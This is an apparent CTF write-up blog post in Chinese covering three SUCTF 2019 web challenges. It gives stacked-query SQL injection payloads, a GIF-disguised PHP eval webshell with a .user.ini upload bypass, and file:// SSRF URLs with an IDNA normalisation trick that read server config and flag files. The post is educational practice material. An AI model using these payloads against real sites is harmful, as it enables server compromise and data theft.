---
title: SUCTF 2019 web复现 部分wp
date: 2020-11-30 22:26:13
categories: CTF做题记录
---
>复现链接：https://buuoj.cn/

<!-- TOC -->

- [[SUCTF 2019]EasySQL](#suctf-2019easysql)
- [[SUCTF 2019]CheckIn](#suctf-2019checkin)
- [[SUCTF 2019]Pythonginx](#suctf-2019pythonginx)

<!-- /TOC -->

<!--more-->
# [SUCTF 2019]EasySQL
这题我也是懵了，过滤太多，堆叠最多查到表名`Flag`，看wp才知道怎么回事\
sql: `select $_GET['query'] || flag from flag`

- 预期解\
payload: `1;set sql_mode=PIPES_AS_CONCAT;select 1`，通过设置MySQL中`sql_mode`的`PIPES_AS_CONCAT`，将`||`变为字符串连接符而不是或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似

- 非预期\
payload: `*,1`，没过滤*导致直接读取全部数据

比赛时源码泄露了，这里贴出来
```php
<?php
    session_start();
    include_once "config.php";
    $post = array();
    $get = array();
    global $MysqlLink;
    //GetPara();
    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);
    if(!$MysqlLink){
        die("Mysql Connect Error!");
    }
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB){
        die("Choose Database Error!");
    }

    foreach ($_POST as $k=>$v){
        if(!empty($v)&&is_string($v)){
            $post[$k] = trim(addslashes($v));
        }
    }
    foreach ($_GET as $k=>$v){
        }
    }
    //die();
    ?>

<html>
<head>
</head>
<body>
<a> Give me your flag, I will tell you if the flag is right. </ a>
<form action="" method="post">
<input type="text" name="query">
<input type="submit">
</form>
</body>
</html>
<?php
    if(isset($post['query'])){
        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|"";
        //var_dump(preg_match("/{$BlackList}/is",$post['query']));
        if(preg_match("/{$BlackList}/is",$post['query'])){
            //echo $post['query'];
            die("Nonono.");
        }
        if(strlen($post['query'])>40){
            die("Too long.");
        }
        $sql = "select ".$post['query']."||flag from Flag";
        mysqli_multi_query($MysqlLink,$sql);
        do{
            if($res = mysqli_store_result($MysqlLink)){
                while($row = mysqli_fetch_row($res)){
                    print_r($row);
                }
            }
        }while(@mysqli_next_result($MysqlLink));
    }
    ?>
```

# [SUCTF 2019]CheckIn
文件上传，fuzz后缀都失败了，随便上传图片有回显路径，且上传目录下有`index.php`，访问其出现`GIF89a?`文件头，上传js图片马，并加上`GIF89a`更改文件后缀为jpg/gif
```js
GIF89a?
<script language="php">eval($_POST['yq1ng']);</script>
```
上传`.htaccess`失败，换姿势----上传目录下有*.php文件也可以用用`.user.ini`
```
GIF89a
auto_prepend_file=js.jpg
```
蚁剑连接upload下的index.php即可\
参考：https://xz.aliyun.com/t/6091

上传源码：
```php
<?php
// error_reporting(0);
$userdir = "uploads/" . md5($_SERVER["REMOTE_ADDR"]);
if (!file_exists($userdir)) {
    mkdir($userdir, 0777, true);
}
file_put_contents($userdir . "/index.php", "");
if (isset($_POST["upload"])) {
    $tmp_name = $_FILES["fileUpload"]["tmp_name"];
    $name = $_FILES["fileUpload"]["name"];
    if (!$tmp_name) {
        die("filesize too big!");
    }
    if (!$name) {
        die("filename cannot be empty!");
    }
    $extension = substr($name, strrpos($name, ".") + 1);
    if (preg_match("/ph|htacess/i", $extension)) {
        die("illegal suffix!");
    }
    if (mb_strpos(file_get_contents($tmp_name), "<?") !== FALSE) {
        die("&lt;? in contents!");
    }
    $image_type = exif_imagetype($tmp_name);
    if (!$image_type) {
        die("exif_imagetype:not image!");
    }
    $upload_file_path = $userdir . "/" . $name;
    move_uploaded_file($tmp_name, $upload_file_path);
    echo "Your dir " . $userdir. ' <br>';
    echo 'Your files : <br>';
    var_dump(scandir($userdir));
}
```

# [SUCTF 2019]Pythonginx
看名知意，给了部分源码，不过俺不会。。。老规矩，先给参考链接，以下可以不看，[参考一](https://blog.csdn.net/qq_42181428/article/details/99741920)，[参考二](https://blog.csdn.net/qq_42812036/article/details/104291695)

```python
    @app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```

源码两条提示
```html
    <!-- Dont worry about the suctf.cc. Go on! -->
    <!-- Do you know the nginx? -->
```

- nginx配置

```
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
配置文件目录为：/usr/local/nginx/conf/nginx.conf
```

解析的URL hostname不能为`suctf.cc`，再次解析的host不能为`suctf.cc`，最后又要等于`suctf.cc`。。。

- 解法一
贴出来师傅的分析脚本
```python
from urllib.parse import urlsplit,urlunsplit, unquote
from urllib import parse
# url = "www.baidu.com/index.php?id=1"
# url = "http:www.baidu.com/index.php?id=1"
url = "file:////suctf.cc/usr/local/nginx/conf/nginx.conf"
parts = parse.urlsplit(url)
print(parts)

url2 = urlunsplit(parts)
parts2 = parse.urlsplit(url2)

print(parts2)

#SplitResult(scheme='file', netloc='', path='suctf.cc/usr/local/nginx/conf/nginx.conf', query='', fragment='')
#SplitResult(scheme='file', netloc='', path='/suctf.cc/usr/local/nginx/conf/nginx.conf', query='', fragment='')
```
用file协议去读，所以构造了`file:////suctf.cc/usr/local/nginx/conf/nginx.conf`去读配置文件\
发现配置文件的路由有flag\
`server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } }`

同样方法读flag

- 解法二
还是师傅脚本
```python
# coding:utf-8 
for i in range(128,65537):    
    tmp=chr(i)    
    try:        
        res = tmp.encode('idna').decode('utf-8')        
        if("-") in res:            
            continue        
        print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))    
    except:        
        pass
```
找出可用字符，用`℆`代替c/u，即构造`file://suctf.c℆sr/local/nginx/conf/nginx.conf`

真难，确实不是我这种菜鸡能单独做出来的，加油，努力成为大菜鸡